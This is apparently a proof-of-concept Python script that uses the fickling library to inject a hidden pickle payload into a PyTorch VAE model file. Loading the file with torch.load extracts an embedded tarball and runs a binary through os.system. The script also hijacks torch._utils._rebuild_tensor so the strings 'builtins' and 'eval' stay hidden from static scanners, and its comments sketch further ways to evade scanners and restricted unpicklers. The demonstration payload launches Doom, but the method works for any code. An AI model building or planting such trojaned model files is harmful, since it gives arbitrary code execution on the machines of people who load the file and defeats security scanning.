# pylint: disable=redefined-builtin,reimported,redefined-outer-name,unspecified-encoding
import io
import os
import pickle
import pickletools as pt
import tarfile

import torch
from fickling import pickle as p
from fickling.pickle import Pickled

from common import Variables, change_frame_len, count_ops, find_main_pickle


def get_doom_binbytes() -> p.BinBytes:
    doom_buf = io.BytesIO()
    doom_ball = tarfile.open(fileobj=doom_buf, mode="w:gz")
    os.chdir("doom")
    # https://www.doomworld.com/3ddownloads/ports/shareware_doom_iwad.zip
    doom_ball.add("DOOM1.WAD")
    # https://github.com/wojciech-graj/doom-ascii/releases/download/v0.1.1/doom_ascii_linux_v0_1_1.zip
    doom_ball.add("doom_ascii")
    print([member.name for member in doom_ball.getmembers()])
    os.chdir("..")
    doom_ball.close()
    doom_buf.seek(0)
    # proto, binbytes, stop
    doom_binbytes = Pickled.load(pickle.dumps(doom_buf.read()))[1]
    print(doom_buf.tell())
    return doom_binbytes


first_bytes, original_dump, last_bytes = find_main_pickle(
    "waifu-diffusion/vae/real_diffusion_pytorch_model.bin"
)
vae_pickle = Pickled.load(original_dump)

# now we're going to fuck with vae_pickle, then do first_bytes + fucked vae_pickle + last_bytes and hope for the best

vars = Variables(count_ops(vae_pickle, p.Memoize))


def set_value(new_value: p.Opcode) -> list[p.Opcode]:
    "_utils.__dict__.update({'_rebuild_tensor': new_value})"
    return [
        vars["_utils"],
        p.EmptyDict(),
        p.Unicode(b"_rebuild_tensor"),
        new_value,
        p.SetItem(),
        p.Build(),
        p.Pop(),
    ]


def get_value(name: p.Opcode = p.Unicode(b"_rebuild_tensor")) -> list[p.Opcode]:
    "pickle._getattribute(torch._utils, '_rebuild_tensor')"
    return [
        p.Unicode(b"torch._utils"),
        name,
        p.StackGlobal(),
    ]


# tl;dr
# get an innocous module
# use BUILD to set variables in the module with innocous names
# import the values you want from it
# those values can't be statically analysed

exploit = [
    # from torch._utils import _rebuild_tensor as orig_rebuild_tensor
    *get_value(),
    vars.add(p.Memoize(), "orig_rebuild_tensor"),
    p.Pop(),
    # from torch import _utils
    p.Unicode(b"torch"),
    p.Unicode(b"_utils"),
    p.StackGlobal(),
    vars.add(p.Memoize(), "_utils"),
    p.Pop(),
    # _utils._rebuild_tensor = "builtins"
    *set_value(p.Unicode(b"builtins")),
    # from torch._utils import _rebuild_tensor as builtins_str
    *get_value(),
    # _utils._rebuild_tensor = "eval"
    *set_value(p.Unicode(b"eval")),
    # from torch._utils import _rebuild_tensor as eval_str
    *get_value(),
    # eval = getattr(sys.modules[builtins_str], eval_str)
    # the idea is you'd need to execute those imports and assignments
    # to know what was imported here
    p.StackGlobal(),
    vars.add(p.Memoize(), "eval"),
    # lambda to untarball so that we can reduce
    p.Unicode(
        b"lambda data: __import__('tarfile').open(fileobj=__import__('io').BytesIO(data)).extractall()"
    ),
    p.TupleOne(),
    # eval that lambda source
    p.Reduce(),
    get_doom_binbytes(),
    p.TupleOne(),
    # extract doom
    p.Reduce(),
    p.Pop(),
    vars["eval"],
    # yolo
    p.Unicode(b"__import__('os').system('./doom_ascii')"),
    p.TupleOne(),
    p.Reduce(),
    p.Pop(),
    # _utils._rebuild_tensor = orig_rebuild_tensor
    *set_value(vars["orig_rebuild_tensor"]),
]


# you can get fancier with abusing building on modules with stack_global
# to find __getattribute__ first and compose strings that way
# to avoid having scary strings in the pickle

# you could also try to defeat restricted unpicklers that check for 'builtins' at runtime

# abuse_pickle_getattribute = [
#     *get_value(),
#     vars.add(p.Memoize(), "original _rebuild_tensor")
#     p.Unicode(b"torch"),
#     p.Unicode(b"_utils"),
#     p.StackGlobal(),
#     vars.add(p.Memoize(), "_utils"),
#     p.Pop(),
#     # _utils._rebuild_tensor =
#     *set_value(p.Unicode(b"_rebuild_tensor.__class__.__getattribute__")),
#     *get_value(),
#     vars.add(p.Memoize(), "evil_path")
#     p.Pop(),
#     *set_value(p.NewObj()), # _utils._rebuild_tensor = object()
#     *get_value(vars["evil_path"]) # _utils._rebuild_tensor.__class__.__getattribute__
#     vars.add(p.Memoize(), "getattr"), # getattr = object.__getattribute__
#     vars["getattr"],
#     vars["getattr"],
#     p.Unicode(b"__class__"),
#     # stack: [getattr, getattr, getattr, "__class__"]
#     vars.add(p.Memoize(), "__class___str"),
#     p.TupleTwo(),
#     p.Reduce(), # getattr(getattr, "__class__")
#     p.Unicode(b"__module__"),
#     p.TupleTwo(),
#     p.Reduce(), # getattr(getattr(getattr, "__class__"), "__module__") = "builtins"
#     vars.add(p.Memoize(), "builtins_str"),
#     p.Unicode(b"exec"), # could compose this with "builtins".__class__.__replace__("torch", "tor", "exe").replace("h", "")
#     # okay maybe that was a little unnecessary? you could keep going with this and tc to prevent scanning
# ]


# since we're not replacing anything real, let's insert just before STOP

# correct framing
# pickle targets frames being under 64 * 1024

exploit_length = len(Pickled(exploit).dumps())

for op in reversed(vae_pickle):
    if isinstance(op, p.Frame):
        change_frame_len(op, exploit_length)
        break

preliminary_result = Pickled(vae_pickle[:-1] + exploit + [p.Stop()])
# we fucked with data and position, so have fickling re-parse the pickle
result = Pickled.load(preliminary_result.dumps())


dumped = result.dumps()
f = open("waifu-diffusion/vae/diffusion_pytorch_model.bin", "wb")
f.write(first_bytes)
f.write(dumped)
f.write(last_bytes)
f.close()


print("loading cool vae")
cool_model = torch.load("waifu-diffusion/vae/diffusion_pytorch_model.bin")
# print(cool_model)
pt.dis(dumped, out=open("vae_dis", "w"))